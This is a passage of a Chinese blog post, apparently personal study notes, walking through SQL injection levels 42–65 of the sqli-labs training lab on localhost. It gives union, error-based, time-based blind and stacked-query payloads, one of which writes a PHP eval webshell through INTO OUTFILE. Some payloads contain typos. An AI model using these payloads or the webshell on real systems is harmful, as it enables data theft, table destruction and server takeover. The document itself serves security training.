+<h4 id="Less42"><a href="#Less42" class="headerlink" title="Less42"></a>Less42</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post请求要使用#注释</span><br><span class="line">a&#x27;;create table crow like users;#</span><br><span class="line">a&#x27;;drop table crow;#</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less43"><a href="#Less43" class="headerlink" title="Less43"></a>Less43</h4><p>‘)</p>
+<hr>
+<h4 id="Less44"><a href="#Less44" class="headerlink" title="Less44"></a>Less44</h4><p>和Less42一致，没有报错信息<br>‘</p>
+<hr>
+<h4 id="Less45"><a href="#Less45" class="headerlink" title="Less45"></a>Less45</h4><p>和Less43一致，没有报错信息<br>‘)</p>
+<hr>
+<h4 id="Less46"><a href="#Less46" class="headerlink" title="Less46"></a>Less46</h4><p>lines terminated by xxx 以xxx为结尾</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select&#x27;&lt;?php @eval(S_ POST[crow]);?&gt;&#x27;into outfile&#x27;C:\\phpstudy\\PHPTutorial\\WWW\\crow.pbp&#x27;lines</span><br><span class="line">terminated by 0x363636;</span><br></pre></td></tr></table></figure>
+
+<p>0x后面一段是16进制的一句话木马<br>![[Pasted image 20230606161120.png]]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">测试 存在注入点</span><br><span class="line">http://localhost/sqli-labs/Less-46/?sort=1 and 1=1</span><br><span class="line">这句有错误，不知为何  错误注入</span><br><span class="line">http://localhost/sqli-labs/Less-46/?sort=3 and updatexml(1, concat(0x7e,(databse()) ), 1)--+</span><br><span class="line">时间注入</span><br><span class="line">http://localhost/sqli-labs/Less-46/?sort=3 and if( (length(database())&gt;1) ,1,sleep(5)   )--+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less47"><a href="#Less47" class="headerlink" title="Less47"></a>Less47</h4><p>’</p>
+<hr>
+<h4 id="Less48"><a href="#Less48" class="headerlink" title="Less48"></a>Less48</h4><p>与Less46一致<br>无法使用报错注入，只能使用时间盲注</p>
+<hr>
+<h4 id="Less49"><a href="#Less49" class="headerlink" title="Less49"></a>Less49</h4><p>与47 48类似<br>‘<br>只能时间盲注</p>
+<hr>
+<h4 id="Less50"><a href="#Less50" class="headerlink" title="Less50"></a>Less50</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">时间注入</span><br><span class="line">http://localhost/sqli-labs/Less-50/?sort=1 and if( (length(database())&gt;1) ,1,sleep(5) )--+</span><br><span class="line">报错注入</span><br><span class="line">http://localhost/sqli-labs/Less-50/?sort=1 and updatexml(1, concat(0x7e,(database())),1)--+</span><br><span class="line">写入一句话木马（这里不演示</span><br><span class="line">堆叠注入创建删除表</span><br><span class="line">http://localhost/sqli-labs/Less-50/?sort=1;create table crow like users;--+</span><br><span class="line">http://localhost/sqli-labs/Less-50/?sort=1;drop table crow;--+</span><br><span class="line">使用堆叠方法写入一句话木马（这里不演示，方法不局限还有其他方法</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less51"><a href="#Less51" class="headerlink" title="Less51"></a>Less51</h4><p>’</p>
+<hr>
+<h4 id="Less52"><a href="#Less52" class="headerlink" title="Less52"></a>Less52</h4><p>没有报错回显，不可使用报错注入。</p>
+<hr>
+<h4 id="Less53"><a href="#Less53" class="headerlink" title="Less53"></a>Less53</h4><p>‘<br>不可报错注入</p>
+<hr>
+<h4 id="Less54"><a href="#Less54" class="headerlink" title="Less54"></a>Less54</h4><p>id&#x3D;<br>‘’<br>“”<br>()<br>(‘’)<br>((“”))<br>((‘’))<br>不加符号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">测试注入点 只有十次机会</span><br><span class="line">http://localhost/sqli-labs/Less-54/?id=-1&#x27; union select 1,2,3--+</span><br><span class="line">http://localhost/sqli-labs/Less-54/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;CHALLENGES&#x27;--+</span><br><span class="line">yjii0ojm5y</span><br><span class="line">http://localhost/sqli-labs/Less-54/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;fwzg6z6107&#x27;--+</span><br><span class="line">id,sessid,secret_EY7D,tryy</span><br><span class="line">http://localhost/sqli-labs/Less-54/?id=-1&#x27; union select 1,2,group_concat(concat_ws(0x7e,secret_EY7D)) from CHALLENGES.yjii0ojm5y--+</span><br><span class="line">X4RFISto9goPD02z36t3mEFX</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h4 id="Less55"><a href="#Less55" class="headerlink" title="Less55"></a>Less55</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">14次机会  (id)</span><br><span class="line">http://localhost/sqli-labs/Less-55/?id=-1) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;CHALLENGES&#x27;--+</span><br><span class="line">my9zt8d12f</span><br><span class="line">http://localhost/sqli-labs/Less-55/?id=-1) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;my9zt8d12f&#x27;--+</span><br><span class="line">secret_67LD</span><br><span class="line">http://localhost/sqli-labs/Less-55/?id=-1) union select 1,2,group_concat(concat_ws(0x7e,secret_67LD)) from CHALLENGES.my9zt8d12f--+</span><br><span class="line">ZzyHEhfD1qHROT2lKDeYI8Le</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less56"><a href="#Less56" class="headerlink" title="Less56"></a>Less56</h4><p>(‘id’)</p>
+<hr>
+<h4 id="Less57"><a href="#Less57" class="headerlink" title="Less57"></a>Less57</h4><p>“id”</p>
+<hr>
+<h4 id="Less58"><a href="#Less58" class="headerlink" title="Less58"></a>Less58</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">报错注入</span><br><span class="line">http://localhost/sqli-labs/Less-58/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;CHALLENGES&#x27;) ),1)--+</span><br><span class="line">yyx72wina0</span><br><span class="line">http://localhost/sqli-labs/Less-58/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;my9zt8d12f&#x27;) ),1)--+</span><br><span class="line">secret_XAE8</span><br><span class="line">http://localhost/sqli-labs/Less-58/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(secret_XAE8) from CHALLENGES.yyx72wina0) ),1)--+</span><br><span class="line">dihvxPDINxChzaT6O0OygRoH</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="Less59"><a href="#Less59" class="headerlink" title="Less59"></a>Less59</h4><p>与58类似，无包裹。<br>id</p>
+<hr>
+<h4 id="Less60"><a href="#Less60" class="headerlink" title="Less60"></a>Less60</h4><p>(“id”)</p>
+<hr>
+<h4 id="Less61"><a href="#Less61" class="headerlink" title="Less61"></a>Less61</h4><p>((‘id’))</p>
+<hr>
+<h4 id="Less62"><a href="#Less62" class="headerlink" title="Less62"></a>Less62</h4><p>(‘id’)<br>只能盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">判断数据库长度</span><br><span class="line">http://localhost/sqli-labs/Less-62/?id=1&#x27;) and if(length(databse()=1),1,sleep(5))--+</span><br><span class="line">判断该表第一个字母是不是比a大</span><br><span class="line">http://localhost/sqli-labs/Less-62/?id=1&#x27;) and if(left((select table_name from information_schema.tables where table_schema=&#x27;CHALLENGES&#x27; limit 0,1),1)&gt;&#x27;a&#x27;,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less63"><a href="#Less63" class="headerlink" title="Less63"></a>Less63</h4><p>‘id’<br>盲注</p>
+<hr>
+<h4 id="Less64"><a href="#Less64" class="headerlink" title="Less64"></a>Less64</h4><p>((id))</p>
+<hr>
+<h4 id="Less65"><a href="#Less65" class="headerlink" title="Less65"></a>Less65</h4><p>(“id”)</p>
+<hr>
+
+    </div>
+     
+    <div class="post-footer__meta"><p>更新于 2024-06-15</p></div> 
+    <div class="post-entry__tags"></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+                <a href="/%E5%93%B2%E5%AD%A6/2024-06-16-mental/Crash%20Course%20Philosophy%20%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0.html" class="nav__link">
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M589.088 790.624L310.464 512l278.624-278.624 45.248 45.248L400.96 512l233.376 233.376z" fill="#808080"></path></svg>
+                    </div>
+                    <div>
+                        <div class="nav__label">
+                            上一篇
+                        </div>
+                        <div class="nav__title">
+                            Crash Course Philosophy 课程笔记
+                        </div>
+                    </div>
+                </a>
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/%E5%AE%89%E5%85%A8/2024-06-16-security/upload-labs.html" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            下一篇
+                        </div>
+                        <div class="nav__title">
+                            upload-labs 通关笔记
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+
+
+</main>
+
+            <footer class="footer">
+     
+    <a href="#" class="button" id="b2t" aria-label="回到顶部" title="回到顶部">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32">
+            <path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path>
+        </svg>
+    </a>
+
+    
+
+
+    
+     
+ 
+
+ 
+    
+        
+        <p class="footer-copyright">
+            Copyright © 2024 <a href="/">YEYEYETO</a>
+        </p>
+    
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+</footer>
+
+        </div>
+        
+    <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+    <script>
+        window.lazyLoadOptions = {
+            elements_selector: ".lazy",
+            threshold: 0
+        };
+    </script>
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+
+
+
+ 
+
+
+    
+ 
+
+
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.css">
+
+    
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.js"></script>
+
+    <script>
+        let lazyloadT = Boolean('true'),
+            auto_fancybox = Boolean('false')
+        if (auto_fancybox) {
+            $(".post__content").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        } else {
+            $(".post__content").find("fancybox").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        }
+    </script>
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+
+    </body>
+</html>
